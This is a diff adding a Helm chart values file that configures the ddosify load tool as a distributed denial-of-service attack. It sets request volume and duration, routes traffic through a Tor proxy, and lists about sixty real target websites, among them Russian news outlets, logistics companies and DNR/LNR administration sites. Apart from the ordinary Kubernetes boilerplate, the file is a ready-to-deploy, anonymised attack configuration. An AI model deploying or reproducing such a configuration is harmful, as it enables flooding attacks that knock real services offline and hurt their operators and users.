@@ -1,0 +1,131 @@
+# Default values for ddosify.
+# This is a YAML-formatted file.
+# Declare variables to be passed into your templates.
+
+replicaCount: 1
+
+torproxy:
+  host: "http://torproxy.torproxy.svc.cluster.local:8118"
+
+ddos:
+  number: 256
+  duration: 12
+  websites:
+    - "https://tvzvezda.ru/"
+    - "http://vesti.ru/"
+    - "http://lenta.ru/"
+    - "http://www.infotrust.ru/"
+    - "https://www.cdek.ru/"
+    - "https://www.dpd.ru/"
+    - "https://pecom.ru/"
+    - "https://www.dellin.ru/"
+    - "https://www.ponyexpress.ru/"
+    - "https://boxberry.ru/"
+    - "https://www.cse.ru/"
+    - "https://ru-dostavka.ru/"
+    - "https://tk-kit.com/"
+    - "https://datrans.ru/"
+    - "http://mashprocess.ru/"
+    - "https://www.sogruz.ru/"
+    - "https://www.povoz.ru/"
+    - "https://pgk.ru/"
+    - "https://trcont.com/"
+    - "https://www.fesco.ru/"
+    - "https://trasko.ru/"
+    - "https://www.baikalsr.ru/"
+    - "https://itecorp.ru/"
+    - "https://www.dentro.ru/"
+    - "https://nrg-tk.ru/"
+    - "https://www.aerodar.ru/"
+    - "https://del-ko.ru/"
+    - "https://www.skif-cargo.ru/"
+    - "https://nordw.ru/"
+    - "https://oooyata.ru/"
+    - "https://perevozka-konteinerov.ru/"
+    - "https://www.mashandling.ru/"
+    - "https://garant-logistika.ru/"
+    - "https://www.flagmanamur.ru/"
+    - "https://123789.ru/"
+    - "https://tranzit-auto.ru/"
+    - "http://sztcom.ru/"
+    - "http://magistrans.ru/"
+    - "https://dugin.ru"
+    - "https://dugin.tv"
+    - "https://eurasia.su"
+    - "https://evrazia.tv"
+    - "https://dnr-news.com/"
+    - "https://dan-news.info/"
+    - "https://dnronline.su/"
+    - "https://lug-info.com/"
+    - "http://sovminlnr.ru/"
+    - "http://nslnr.su/"
+    - "https://mvdlnr.ru/"
+    - "https://gtrklnr.com/"
+    - "https://www.lugvoda.com/"
+    - "https://gtklnr.su/"
+    - "https://uinlnr.su/"
+    - "http://lutugino.su/"
+    - "http://mzlnr.su/"
+    - "https://novosti.dn.ua/"
+    - "https://mzdnr.ru/"
+    - "https://dnrsovet.su/"
+    - "https://pravdnr.ru/"
+    - "https://glavadnr.ru/"
+    - "http://mdsdnr.ru/"
+    - "https://www.mid-dnr.su/ru/"
+    - "https://xn--h1aheeehel.xn--p1acf/"
+    - "http://www.agrodon.su/"
+    - "https://dnrailway.ru/"
+    - "https://gisnpa-dnr.ru/"
+    - "https://gb-dnr.com/"
+    - "https://www.donland.ru/"
+
+image:
+  repository: ddosify/ddosify
+  pullPolicy: Always
+  # Overrides the image tag whose default is the chart appVersion.
+  tag: "latest"
+
+imagePullSecrets: []
+nameOverride: ""
+fullnameOverride: ""
+
+serviceAccount:
+  # Specifies whether a service account should be created
+  create: true
+  # Annotations to add to the service account
+  annotations: {}
+  # The name of the service account to use.
+  # If not set and create is true, a name is generated using the fullname template
+  name: ""
+
+podAnnotations: {}
+
+podSecurityContext: {}
+  # fsGroup: 2000
+
+securityContext: {}
+  # capabilities:
+  #   drop:
+  #   - ALL
+  # readOnlyRootFilesystem: true
+  # runAsNonRoot: true
+  # runAsUser: 1000
+
+resources:
+   requests:
+     cpu: 60m
+     memory: 64Mi
+
+autoscaling:
+  enabled: false
+  minReplicas: 1
+  maxReplicas: 100
+  targetCPUUtilizationPercentage: 80
+  # targetMemoryUtilizationPercentage: 80
+
+nodeSelector: {}
+
+tolerations: []
+
+affinity: {}
